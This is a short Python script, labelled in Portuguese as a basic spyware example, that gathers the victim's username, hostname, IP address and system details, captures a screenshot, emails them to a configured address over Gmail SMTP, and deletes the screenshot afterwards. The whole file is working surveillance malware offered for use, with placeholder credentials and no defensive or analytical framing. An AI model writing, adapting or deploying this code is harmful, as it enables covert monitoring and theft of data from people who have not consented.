"""

Exemplo básico de spyware em python

"""

import os
import shutil
import smtplib
import getpass
import platform
import datetime
import socket
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

# Configurações do spyware
sender_email = 'seu_email@gmail.com'
sender_password = 'sua_senha'
receiver_email = 'email_destino@gmail.com'
smtp_server = 'smtp.gmail.com'
smtp_port = 587

# Função para capturar uma captura de tela
def capture_screenshot():
    import pyautogui
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')

# Função para obter informações do sistema
def get_system_info():
    info = {
        'Username': getpass.getuser(),
        'Hostname': socket.gethostname(),
        'IP Address': socket.gethostbyname(socket.gethostname()),
        'OS': platform.system(),
        'Processor': platform.processor(),
        'Architecture': platform.machine(),
        'Date and Time': str(datetime.datetime.now())
    }
    return info

# Função para enviar um e-mail com as informações coletadas
def send_email(subject, body, attachment=None):
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject

    message.attach(MIMEText(body, 'plain'))

    if attachment:
        with open(attachment, 'rb') as file:
            image = MIMEImage(file.read(), name=os.path.basename(attachment))
            message.attach(image)

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(message)
        server.quit()
        print('E-mail enviado com sucesso!')
    except Exception as e:
        print('Erro ao enviar e-mail:', str(e))

# Função principal
def main():
    # Captura de informações do sistema
    system_info = get_system_info()

    # Captura de uma captura de tela
    capture_screenshot()

    # Envia um e-mail com as informações coletadas e a captura de tela
    send_email('Spyware Report', str(system_info), 'screenshot.png')

    # Apaga a captura de tela após o envio
    os.remove('screenshot.png')

if __name__ == '__main__':
    main()
